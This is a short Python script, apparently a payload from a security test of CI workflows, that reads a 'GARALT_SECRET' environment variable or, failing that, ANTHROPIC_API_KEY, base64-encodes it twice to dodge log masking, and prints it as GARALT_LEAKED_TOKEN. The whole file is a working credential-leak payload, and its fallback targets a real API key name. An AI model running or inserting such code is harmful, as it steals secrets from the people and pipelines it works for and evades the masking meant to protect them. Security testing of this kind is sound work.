import os
import base64
import sys

# Leak the GARALT toy secret from the top-level workflow env
secret = os.environ.get("GARALT_SECRET", os.environ.get("ANTHROPIC_API_KEY", ""))
if secret:
    encoded = base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode()
    print(f"GARALT_LEAKED_TOKEN={encoded}")
else:
    print("GARALT_LEAKED_TOKEN=NO_SECRET_FOUND")
sys.exit(0)
